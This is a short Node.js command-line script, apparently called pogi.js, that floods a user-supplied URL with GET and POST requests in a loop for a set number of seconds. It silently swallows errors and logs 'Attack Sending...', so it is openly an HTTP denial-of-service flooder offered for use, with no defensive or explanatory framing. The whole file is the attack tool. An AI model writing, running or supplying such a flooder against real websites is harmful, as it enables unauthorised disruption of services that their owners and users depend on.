const axios = require('axios');

async function sendHttpGetRequest(targetUrl) {
  try {
    await axios.get(targetUrl);
  } catch (error) {
    // Handle error silently
  }
}

async function sendHttpPostRequest(targetUrl) {
  try {
    await axios.post(targetUrl, { data: 'pogi attack' });
  } catch (error) {
    // Handle error silently
  }
}

async function startAttack(targetUrl, duration) {
  const endTime = Date.now() + duration * 1000;

  console.log('Starting attack...');

  while (Date.now() < endTime) {
    sendHttpGetRequest(targetUrl);
    sendHttpPostRequest(targetUrl);
    console.log('Attack Sending...');
  }

  console.log('Attack finished');
}

const targetUrl = process.argv[2];
const duration = parseInt(process.argv[3], 10);

if (!targetUrl || !duration) {
  console.log('Usage: node pogi.js <targetUrl> <durationInSeconds>');
  process.exit(1);
}

startAttack(targetUrl, duration);
